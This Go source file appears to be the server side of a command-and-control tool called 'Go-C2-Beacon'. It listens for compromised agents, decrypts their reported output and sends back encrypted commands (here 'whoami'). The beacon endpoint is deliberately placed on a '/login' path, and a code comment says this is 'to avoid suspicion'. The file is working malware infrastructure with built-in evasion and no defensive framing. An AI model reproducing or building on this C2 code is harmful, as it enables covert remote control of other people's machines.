package main

import (
	"fmt"
	"io"
	"net/http"
	"Go-C2-Beacon/common"
)

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	// Read the data from the agent.
	body, _ := io.ReadAll(r.Body)
	if len(body) > 0 {
		decrypted, _ := common.Decrypt(body)
		fmt.Printf("[+] Response: %s\n", string(decrypted))
	}

	// Send a new command (Example: whoami)
	nextCommand := "whoami" 
	encryptedCmd, _ := common.Encrypt([]byte(nextCommand))
	w.Write(encryptedCmd)
}

func main() {
	http.HandleFunc("/login", beaconHandler) // To avoid suspicion, use /login path
	fmt.Println("[*] C2 Server is Listening: :8080")
	http.ListenAndServe(":8080", nil)
}